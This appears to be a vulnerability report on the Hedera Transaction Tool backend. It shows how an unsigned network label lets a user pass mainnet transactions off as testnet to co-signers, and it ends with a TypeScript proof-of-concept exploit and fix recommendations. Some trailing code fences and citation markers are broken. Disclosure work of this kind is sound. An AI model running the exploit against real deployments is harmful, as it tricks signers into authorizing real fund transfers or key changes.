### Title
Malicious Registered User Can Trick Co-Signers Into Unknowingly Authorizing Mainnet Transactions Labeled as Testnet

### Summary
The `mirrorNetwork` field in `CreateTransactionDto` is user-supplied and is not cryptographically bound to the transaction bytes. The creator's signature only covers `transactionBytes`, not `mirrorNetwork`. Because Hedera mainnet and testnet share overlapping node account IDs (0.0.3–0.0.9), a malicious registered organization user can submit a mainnet transaction with `mirrorNetwork: 'testnet'`, pass all server-side validation, and collect co-signer signatures from users who believe they are signing a harmless testnet transaction.

### Finding Description

**Root cause — `mirrorNetwork` is not signed and not cryptographically bound to `transactionBytes`.**

In `validateAndPrepareTransaction`:

```
back-end/apps/api/src/transactions/transactions.service.ts:910
const validSignature = publicKey.verify(dto.transactionBytes, dto.signature);
```

The signature covers only `dto.transactionBytes`. The `mirrorNetwork` value is accepted from user input without any binding to the signed payload. [1](#0-0) 

The node-validation guard that is supposed to prevent cross-network submissions:

```
back-end/apps/api/src/transactions/transactions.service.ts:934-936
const allowedNodes = getNodeAccountIdsFromClientNetwork(client);
if (!isTransactionValidForNodes(sdkTransaction, allowedNodes)) {
  throw new BadRequestException(ErrorCodes.TNVN);
}
```

uses a `Client` built from `dtos[0].mirrorNetwork`. [2](#0-1) 

The client is constructed here:

```
back-end/apps/api/src/transactions/transactions.service.ts:405
const client = await getClientFromNetwork(dtos[0].mirrorNetwork);
``` [3](#0-2) 

**Why the node-validation guard fails:** Hedera mainnet and testnet share node account IDs 0.0.3 through 0.0.9. A mainnet transaction constructed with only those node IDs passes testnet node validation because the account IDs are identical on both networks. The `isTransactionValidForNodes` check compares account ID strings, not network endpoints. [4](#0-3) 

**The stored `mirrorNetwork` comes from the attacker-controlled DTO field**, not from the validated client:

```
back-end/apps/api/src/transactions/transactions.service.ts:449
mirrorNetwork: data.mirrorNetwork,
``` [5](#0-4) 

**End-to-end exploit path:**

1. Attacker is a registered organization user with a key enrolled in the system.
2. Attacker constructs a mainnet `TransferTransaction` (or `AccountUpdateTransaction`) targeting mainnet accounts, using only node IDs 0.0.3–0.0.9 (valid on both mainnet and testnet).
3. Attacker signs `transactionBytes` with their registered private key.
4. Attacker POSTs to `POST /transactions` with `mirrorNetwork: 'testnet'` and the mainnet transaction bytes.
5. Server validation passes: signature is valid, node IDs 0.0.3–0.0.9 are in the testnet node set, transaction is not expired.
6. Transaction is stored in the database labeled as a testnet transaction.
7. Co-signers receive a notification to sign what appears to be a testnet transaction. The UI displays `mirrorNetwork: testnet`.
8. Co-signers sign the transaction.
9. Attacker calls `GET /transactions/:id` to retrieve the fully-signed `transactionBytes`.
10. Attacker submits the signed bytes directly to mainnet via the Hedera SDK or gRPC outside the tool.
11. The mainnet transaction executes with all collected signatures.

The signed transaction bytes are retrievable because the backend stores and exposes them: [6](#0-5) 

### Impact Explanation

Co-signers unknowingly authorize real mainnet transactions. Depending on the transaction type, this enables:

- Unauthorized HBAR transfers on mainnet draining accounts that require multi-party approval.
- Unauthorized `AccountUpdateTransaction` replacing account keys on mainnet.
- Unauthorized `FileUpdateTransaction` modifying Hedera system files (fee schedules, address books) — the tool is explicitly used for these high-stakes operations by the Hedera Council.

The Hedera Transaction Tool's stated purpose is managing high-stakes network operations for the Hedera Council. A successful attack against council members signing what they believe is a testnet transaction constitutes a critical integrity failure.

### Likelihood Explanation

The attacker requires only a registered organization user account — no admin, operator, or governance keys. This is the "malicious normal user abusing valid product flows" profile. The attack requires no cryptographic breaks, no race conditions, and no special timing. It is fully deterministic and repeatable. The only prerequisite is that the attacker's key is enrolled in the organization, which is a normal onboarding step.

### Recommendation

Bind `mirrorNetwork` to the creator's signature. The creator should sign a payload that includes both `transactionBytes` and `mirrorNetwork` (e.g., `sign(hash(transactionBytes || mirrorNetwork))`), and the backend should verify this combined payload. The existing `verifyTransactionBodyWithoutNodeAccountIdSignature` utility in the codebase demonstrates the pattern of signing a derived payload rather than raw bytes. [7](#0-6) 

Alternatively, after freezing the transaction against the claimed network's client, verify that `sdkTransaction.toBytes()` is identical to `dto.transactionBytes` — a transaction frozen against testnet will embed testnet-specific state that differs from a mainnet-frozen transaction.

### Proof of Concept

```typescript
import { TransferTransaction, Hbar, AccountId, TransactionId, PrivateKey, Client } from '@hiero-ledger/sdk';

// Step 1: Build a mainnet transaction using shared node IDs
const mainnetTx = new TransferTransaction()
  .setTransactionId(TransactionId.generate('0.0.1234'))  // mainnet payer
  .setNodeAccountIds([AccountId.fromString('0.0.3')])    // shared node ID
  .addHbarTransfer('0.0.1234', new Hbar(-10))
  .addHbarTransfer('0.0.5678', new Hbar(10))             // attacker's mainnet account
  .freeze();

const txBytes = mainnetTx.toBytes();

// Step 2: Sign with attacker's registered key
const attackerKey = PrivateKey.fromStringECDSA('<attacker_private_key>');
const signature = Buffer.from(attackerKey.sign(txBytes)).toString('hex');

// Step 3: Submit to backend claiming testnet
await fetch('https://org-backend/transactions', {
  method: 'POST',
  headers: { Authorization: 'Bearer <attacker_token>', 'Content-Type': 'application/json' },
  body: JSON.stringify({
    name: 'Routine testnet transfer',
    transactionBytes: Buffer.from(txBytes).toString('hex'),
    mirrorNetwork: 'testnet',   // <-- lie: this is actually a mainnet transaction
    signature,
    creatorKeyId: <attacker_key_id>,
  }),
});

// Step 4: Co-signers sign thinking it's testnet
// Step 5: Attacker retrieves signed bytes and submits to mainnet
const signedBytes = /* GET /transactions/:id -> transactionBytes */;
const mainnetClient = Client.forMainnet();
await mainnetClient.execute(Transaction.fromBytes(signedBytes));
// Mainnet transfer executes
```

export const getNodeAccountIdsFromClientNetwork = (client: Client): Set<string> => {
  const network = client.network as { [key: string]: string | AccountId };
  const values = Object.values(network ?? {});
  return new Set(
    values.map((v) =>
      v instanceof AccountId ? v.toString() : AccountId.fromString(String(v)).toString(),
    ),
  );
};
```

/* Verify the signature of the transaction body without node account id */
export const verifyTransactionBodyWithoutNodeAccountIdSignature = (
  transaction: SDKTransaction,
  signature: string | Buffer,
  publicKey: string | PublicKey,
) => {
  const bodyBytes = getTransactionBodyBytes(transaction);

  /* Deserialize Public Key */
  publicKey = publicKey instanceof PublicKey ? publicKey : PublicKey.fromString(publicKey);

  /* Deserialize Signature */
  signature = typeof signature === 'string' ? decode(signature) : signature;

  try {
    return publicKey.verify(bodyBytes, signature);
  } catch (err) {
    console.log(err);
    return false;
  }
};
